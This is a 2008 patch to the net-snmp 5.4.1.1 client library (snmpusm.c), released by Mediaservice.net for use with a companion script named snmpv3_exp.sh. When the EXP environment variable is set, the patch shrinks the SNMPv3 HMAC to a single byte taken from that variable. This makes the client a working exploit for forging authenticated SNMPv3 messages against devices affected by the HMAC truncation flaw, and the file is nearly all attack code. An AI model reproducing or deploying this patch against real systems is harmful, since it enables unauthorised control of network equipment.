@@ -1,0 +1,70 @@
+#############################################################################
+#                                                                           #
+# snmpv3_exp.patch is a patch for net-snmp 5.4.1.1 that allow to change the #
+# HMAC len. The client will work normaly until the environment variable EXP #
+# is not defined. Use this patch with snmpv3_exp.sh                         #
+#                                                                           #
+# Copyright (c) 2008 @ Mediaservice.net Srl. All rights reserved            #
+# Wrote by Maurizio Agazzini <inode[at]mediaservice.net>                    #
+# http://lab.mediaservice.net/                                              #
+#                                                                           #
+# Redistribution and use in source and binary forms, with or without        #
+# modification, are permitted provided that the following conditions        #
+# are met:                                                                  #
+#     # Redistributions of source code must retain the above copyright      #
+#       notice, this list of conditions and the following disclaimer.       #
+#     # Redistributions in binary form must reproduce the above copyright   #
+#       notice, this list of conditions and the following disclaimer in     #
+#       the documentation and/or other materials provided with the          #
+#       distribution.                                                       #
+#     # Neither the name of @ Mediaservice.net nor the names of its         #
+#       contributors may be used to endorse or promote products derived     #
+#       from this software without specific prior written permission.       #
+#                                                                           #
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS       #
+# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT         #
+# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR     #
+# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT      #
+# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,     #
+# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED  #
+# TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR    #
+# PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF    #
+# LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING      #
+# NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS        #
+# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.              #
+#############################################################################
+
+
+--- /home/inode/net-snmp-5.4.1.1/snmplib/snmpusm.c	2006-09-15 02:48:50.000000000 +0200
++++ snmplib/snmpusm.c	2008-06-11 11:16:37.000000000 +0200
+@@ -1358,6 +1358,8 @@
+     size_t          sp_offset = 0, mac_offset = 0;
+     int             rc = 0;
+ 
++    char * exploiting = NULL;
++
+     DEBUGMSGTL(("usm", "USM processing has begun (offset %d)\n", *offset));
+ 
+     if (secStateRef != NULL) {
+@@ -1606,6 +1608,11 @@
+         msgAuthParmLen = USM_MD5_AND_SHA_AUTH_LEN;
+     }
+ 
++    exploiting = getenv("EXP");
++
++    if( exploiting != NULL )
++	msgAuthParmLen = 1;
++
+     rc = asn_realloc_rbuild_string(wholeMsg, wholeMsgLen, offset, 1,
+                                    (u_char) (ASN_UNIVERSAL | ASN_PRIMITIVE
+                                              | ASN_OCTET_STR), authParams,
+@@ -1773,6 +1780,9 @@
+             return SNMPERR_USM_AUTHENTICATIONFAILURE;
+         }
+ 
++	if ( exploiting != NULL )
++		temp_sig[0] = atoi(exploiting);
++
+         memcpy(*wholeMsg + *wholeMsgLen - mac_offset, temp_sig,
+                msgAuthParmLen);
+         SNMP_FREE(temp_sig);
